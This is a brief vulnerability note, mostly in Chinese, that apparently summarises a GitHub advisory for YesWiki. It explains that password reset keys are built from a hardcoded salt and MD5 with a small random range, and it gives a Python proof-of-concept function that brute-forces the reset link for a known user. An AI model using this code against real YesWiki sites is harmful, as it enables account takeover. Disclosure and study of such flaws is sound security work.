https://github.com/advisories/GHSA-4fvx-h823-38v3

tpl
yeswiki/yeswiki (
Composer
)


vul func:
generateUserLink() (位于includes/services/UserManager.php)


漏洞触发条件:
系统使用硬编码盐值FBcA和弱哈希算法(MD5)生成密码重置密钥
攻击者已知目标用户名和邮箱
可在有限范围内(0-10000)暴力破解随机数

poc:
# 关键漏洞利用代码
def check_key(random_int_val: int, timestamp_req: str, domain: str, username: str, email: str):
    user_base64 = b64encode(username.encode()).decode()
    data = f"{username}_{email}{random_int_val}{timestamp_req}{salt}"  # 使用硬编码盐值构造数据
    hash_candidate = md5(data.encode()).hexdigest()  # 使用MD5弱哈希
    url = f"{domain}?MotDePassePerdu&a=recover&email={hash_candidate}&u={user_base64}"
    response = get(url)
    if '<strong>Bienvenu.e' in response.text or '<strong>Welcome' in response.text:
        return (True, random_int_val, hash_candidate, url)
    return (False, random_int_val, None, None)
